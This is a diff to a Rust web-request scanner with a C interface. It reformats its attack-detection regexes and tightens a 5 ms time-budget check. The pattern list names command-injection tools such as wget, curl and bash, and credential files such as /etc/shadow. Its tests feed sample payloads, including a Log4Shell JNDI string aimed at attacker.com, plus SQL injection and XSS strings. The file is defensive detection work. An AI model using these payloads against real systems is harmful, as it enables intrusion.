@@ -1,7 +1,7 @@
 use once_cell::sync::Lazy;
 use regex::Regex;
 use std::sync::Mutex;
-use std::time::Instant;
+use std::time::{Duration, Instant};
 
 // Return codes (ABI contract — docs/spec/c-ffi-modules.md §4)
 const LUAGATE_OK: i32 = 0;
@@ -10,7 +10,7 @@ const LUAGATE_BUDGET_EXCEEDED: i32 = -3;
 const LUAGATE_INTERNAL_ERROR: i32 = -4;
 
 // Per-request budget: 5 ms
-const BUDGET_MS: u128 = 5;
+const BUDGET_NS: u128 = 5_000_000;
 
 // Input size limits: 8 KB per field
 const MAX_FIELD_LEN: usize = 8 * 1024;
@@ -37,37 +37,117 @@ static SCANNER: Lazy<Mutex<Option<Scanner>>> = Lazy::new(|| Mutex::new(None));
 fn build_default_scanner() -> Scanner {
     let raw_patterns: &[(&'static str, &'static str, &'static str, f64)] = &[
         // sqli
-        ("sqli", "sqli_union_select",     r"(?i)(union\s+(all\s+)?select)",                   0.9),
-        ("sqli", "sqli_or_always_true",   r"(?i)(or\s+1\s*=\s*1|and\s+1\s*=\s*1)",           0.8),
-        ("sqli", "sqli_drop_table",       r"(?i)(;\s*(drop|delete|insert|update)\s+)",        0.95),
-        ("sqli", "sqli_exec",             r"(?i)(exec\s*\(|execute\s*\()",                    0.9),
-        ("sqli", "sqli_schema_leak",      r"(?i)(information_schema|@@version|@@datadir)",    0.85),
+        (
+            "sqli",
+            "sqli_union_select",
+            r"(?i)(union\s+(all\s+)?select)",
+            0.9,
+        ),
+        (
+            "sqli",
+            "sqli_or_always_true",
+            r"(?i)(or\s+1\s*=\s*1|and\s+1\s*=\s*1)",
+            0.8,
+        ),
+        (
+            "sqli",
+            "sqli_drop_table",
+            r"(?i)(;\s*(drop|delete|insert|update)\s+)",
+            0.95,
+        ),
+        ("sqli", "sqli_exec", r"(?i)(exec\s*\(|execute\s*\()", 0.9),
+        (
+            "sqli",
+            "sqli_schema_leak",
+            r"(?i)(information_schema|@@version|@@datadir)",
+            0.85,
+        ),
         // xss
-        ("xss", "xss_script_tag",         r"(?i)<\s*script[^>]*>",                            0.9),
-        ("xss", "xss_javascript_uri",     r"(?i)javascript\s*:",                              0.85),
-        ("xss", "xss_event_handler",      r"(?i)\bon\w+\s*=",                                 0.8),
-        ("xss", "xss_img_onerror",        r"(?i)<\s*img[^>]+onerror\s*=",                     0.9),
-        ("xss", "xss_dom_sink",           r"(?i)(document\.cookie|document\.write|eval\s*\()", 0.85),
+        ("xss", "xss_script_tag", r"(?i)<\s*script[^>]*>", 0.9),
+        ("xss", "xss_javascript_uri", r"(?i)javascript\s*:", 0.85),
+        ("xss", "xss_event_handler", r"(?i)\bon\w+\s*=", 0.8),
+        (
+            "xss",
+            "xss_img_onerror",
+            r"(?i)<\s*img[^>]+onerror\s*=",
+            0.9,
+        ),
+        (
+            "xss",
+            "xss_dom_sink",
+            r"(?i)(document\.cookie|document\.write|eval\s*\()",
+            0.85,
+        ),
         // path_traversal
-        ("path_traversal", "path_traversal_dotdot",    r"(\.\.[\\/])",                        0.9),
-        ("path_traversal", "path_traversal_encoded",   r"(?i)(%2e%2e[%2f%5c])",               0.9),
-        ("path_traversal", "path_traversal_unix",      r"(?i)(/etc/passwd|/etc/shadow|/proc/self)", 0.95),
-        ("path_traversal", "path_traversal_windows",   r"(?i)(c:\\windows\\)",                0.9),
+        (
+            "path_traversal",
+            "path_traversal_dotdot",
+            r"(\.\.[\\/])",
+            0.9,
+        ),
+        (
+            "path_traversal",
+            "path_traversal_encoded",
+            r"(?i)(%2e%2e[%2f%5c])",
+            0.9,
+        ),
+        (
+            "path_traversal",
+            "path_traversal_unix",
+            r"(?i)(/etc/passwd|/etc/shadow|/proc/self)",
+            0.95,
+        ),
+        (
+            "path_traversal",
+            "path_traversal_windows",
+            r"(?i)(c:\\windows\\)",
+            0.9,
+        ),
         // cmd_injection
-        ("cmd_injection", "cmd_injection_shell_cmd",   r"[;&|`]\s*(ls|cat|id|whoami|uname|wget|curl|chmod|bash|sh)\b", 0.9),
-        ("cmd_injection", "cmd_injection_subshell",    r"(?i)\$\(.*\)",                       0.85),
-        ("cmd_injection", "cmd_injection_backtick",    r"`[^`]+`",                            0.8),
+        (
+            "cmd_injection",
+            "cmd_injection_shell_cmd",
+            r"[;&|`]\s*(ls|cat|id|whoami|uname|wget|curl|chmod|bash|sh)\b",
+            0.9,
+        ),
+        (
+            "cmd_injection",
+            "cmd_injection_subshell",
+            r"(?i)\$\(.*\)",
+            0.85,
+        ),
+        ("cmd_injection", "cmd_injection_backtick", r"`[^`]+`", 0.8),
         // ssrf
-        ("ssrf", "ssrf_internal_host",    r"(?i)(https?://(localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.))", 0.9),
-        ("ssrf", "ssrf_dangerous_scheme", r"(?i)(file://|gopher://|dict://)",                 0.9),
+        (
+            "ssrf",
+            "ssrf_internal_host",
+            r"(?i)(https?://(localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.))",
+            0.9,
+        ),
+        (
+            "ssrf",
+            "ssrf_dangerous_scheme",
+            r"(?i)(file://|gopher://|dict://)",
+            0.9,
+        ),
         // xxe
-        ("xxe", "xxe_entity_decl",        r"(?i)(<!entity\s)",                                0.9),
-        ("xxe", "xxe_doctype_system",     r"(?i)(<!doctype[^>]+system\s)",                    0.85),
+        ("xxe", "xxe_entity_decl", r"(?i)(<!entity\s)", 0.9),
+        (
+            "xxe",
+            "xxe_doctype_system",
+            r"(?i)(<!doctype[^>]+system\s)",
+            0.85,
+        ),
         // log4shell
-        ("log4shell", "log4shell_jndi",   r"(?i)\$\{jndi\s*:",                               1.0),
-        ("log4shell", "log4shell_nested", r"(?i)\$\{.*:.*\{",                                 0.8),
+        ("log4shell", "log4shell_jndi", r"(?i)\$\{jndi\s*:", 1.0),
+        ("log4shell", "log4shell_nested", r"(?i)\$\{.*:.*\{", 0.8),
         // scanner (automated scanner detection — matches common UA strings embedded in params)
-        ("scanner", "scanner_tool",       r"(?i)(sqlmap|nikto|nessus|openvas|masscan|nmap|dirbuster|gobuster|wfuzz|hydra)", 0.9),
+        (
+            "scanner",
+            "scanner_tool",
+            r"(?i)(sqlmap|nikto|nessus|openvas|masscan|nmap|dirbuster|gobuster|wfuzz|hydra)",
+            0.9,
+        ),
     ];
 
     let patterns = raw_patterns
@@ -85,6 +165,10 @@ fn build_default_scanner() -> Scanner {
     Scanner { patterns }
 }
 
+fn budget_exceeded(elapsed: Duration) -> bool {
+    elapsed.as_nanos() > BUDGET_NS
+}
+
 // ---------------------------------------------------------------------------
 // Public C API
 // ---------------------------------------------------------------------------
@@ -98,10 +182,7 @@ fn build_default_scanner() -> Scanner {
 /// `patterns_path` must be a valid pointer to `patterns_path_len` bytes, or
 /// NULL when `patterns_path_len` == 0.
 #[no_mangle]
-pub extern "C" fn luagate_scanner_init(
-    patterns_path: *const i8,
-    patterns_path_len: usize,
-) -> i32 {
+pub extern "C" fn luagate_scanner_init(patterns_path: *const i8, patterns_path_len: usize) -> i32 {
     let scanner = if !patterns_path.is_null() && patterns_path_len > 0 {
         // Attempt to load patterns from the supplied directory.  Fall back to
         // hardcoded defaults on any error so the scanner is always available.
@@ -204,9 +285,7 @@ pub extern "C" fn luagate_scan_http(
             Err(_) => {
                 // Invalid UTF-8 — lossy conversion; scan continues with
                 // replacement characters so attack bytes are not silently skipped.
-                eprintln!(
-                    "[luagate_scanner] WARNING: invalid UTF-8 input, using lossy conversion"
-                );
+                eprintln!("[luagate_scanner] WARNING: invalid UTF-8 input, using lossy conversion");
                 Some((String::from_utf8_lossy(bytes).into_owned(), true))
             }
         }
@@ -250,7 +329,7 @@ pub extern "C" fn luagate_scan_http(
 
     for pattern in &scanner.patterns {
         // Budget check per pattern.
-        if start.elapsed().as_millis() >= BUDGET_MS {
+        if budget_exceeded(start.elapsed()) {
             return LUAGATE_BUDGET_EXCEEDED;
         }
 
@@ -349,10 +428,7 @@ mod tests {
         );
 
         let threat = if threat_len > 0 {
-            let bytes: Vec<u8> = threat_buf[..threat_len]
-                .iter()
-                .map(|&b| b as u8)
-                .collect();
+            let bytes: Vec<u8> = threat_buf[..threat_len].iter().map(|&b| b as u8).collect();
             String::from_utf8_lossy(&bytes).to_string()
         } else {
             String::new()
@@ -377,6 +453,12 @@ mod tests {
     }
 
     #[test]
+    fn test_budget_threshold_is_strictly_greater_than_five_ms() {
+        assert!(!budget_exceeded(Duration::from_millis(5)));
+        assert!(budget_exceeded(Duration::from_nanos(5_000_001)));
+    }
+
+    #[test]
     fn test_sqli_detection() {
         let (rc, threat, rule, score) =
             make_scan_call("/api/users", "id=1 UNION SELECT * FROM users");
@@ -388,8 +470,7 @@ mod tests {
 
     #[test]
     fn test_xss_detection() {
-        let (rc, threat, _, _) =
-            make_scan_call("/page", "q=<script>alert(1)</script>");
+        let (rc, threat, _, _) = make_scan_call("/page", "q=<script>alert(1)</script>");
         assert_eq!(rc, 0);
         assert_eq!(threat, "xss");
     }
@@ -403,8 +484,7 @@ mod tests {
 
     #[test]
     fn test_log4shell_detection() {
-        let (rc, threat, _, score) =
-            make_scan_call("/", "x=${jndi:ldap://attacker.com/a}");
+        let (rc, threat, _, score) = make_scan_call("/", "x=${jndi:ldap://attacker.com/a}");
         assert_eq!(rc, 0);
         assert_eq!(threat, "log4shell");
         assert!(score >= 0.9);
@@ -515,24 +595,21 @@ mod tests {
 
     #[test]
     fn test_ssrf_detection() {
-        let (rc, threat, _, _) =
-            make_scan_call("/proxy", "url=http://127.0.0.1/admin");
+        let (rc, threat, _, _) = make_scan_call("/proxy", "url=http://127.0.0.1/admin");
         assert_eq!(rc, 0);
         assert_eq!(threat, "ssrf");
     }
 
     #[test]
     fn test_xxe_detection() {
-        let (rc, threat, _, _) =
-            make_scan_call("/upload", "data=<!entity foo system");
+        let (rc, threat, _, _) = make_scan_call("/upload", "data=<!entity foo system");
         assert_eq!(rc, 0);
         assert_eq!(threat, "xxe");
     }
 
     #[test]
     fn test_scanner_tool_detection() {
-        let (rc, threat, _, _) =
-            make_scan_call("/search", "ua=sqlmap/1.0");
+        let (rc, threat, _, _) = make_scan_call("/search", "ua=sqlmap/1.0");
         assert_eq!(rc, 0);
         assert_eq!(threat, "scanner");
     }
@@ -675,7 +752,10 @@ mod tests {
 
         // Must return OK and detect sqli despite the leading invalid byte.
         assert_eq!(rc, LUAGATE_OK);
-        assert!(threat_len > 0, "threat should be detected even with invalid UTF-8 input");
+        assert!(
+            threat_len > 0,
+            "threat should be detected even with invalid UTF-8 input"
+        );
         let threat_bytes: Vec<u8> = threat_buf[..threat_len].iter().map(|&b| b as u8).collect();
         let threat = String::from_utf8_lossy(&threat_bytes).to_string();
         assert_eq!(threat, "sqli");
@@ -724,7 +804,9 @@ mod tests {
             *guard = saved;
         }
 
-        assert_eq!(rc, LUAGATE_INTERNAL_ERROR,
-            "uninitialized scanner must return INTERNAL_ERROR, not auto-init");
+        assert_eq!(
+            rc, LUAGATE_INTERNAL_ERROR,
+            "uninitialized scanner must return INTERNAL_ERROR, not auto-init"
+        );
     }
 }
